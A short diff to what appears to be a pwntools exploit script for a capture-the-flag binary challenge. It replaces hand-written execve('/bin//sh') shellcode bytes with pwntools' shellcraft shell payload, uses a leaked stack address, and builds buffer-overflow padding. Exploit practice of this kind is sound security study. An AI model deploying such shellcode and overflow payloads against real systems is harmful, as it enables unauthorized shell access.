@@ -7,11 +7,7 @@ p.recvuntil('\n')
 _ = p.recvline().strip()
 stack = int(_,16)
 
-# http://shell-storm.org/shellcode/files/shellcode-905.php
-shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
-shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
-shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
-shellcode += b'\x49\x89\xd2\x0f\x05'
+shellcode = asm(shellcraft.sh())
 
 payload  = b''
 payload += (0x4e - 0x44) * b'A'
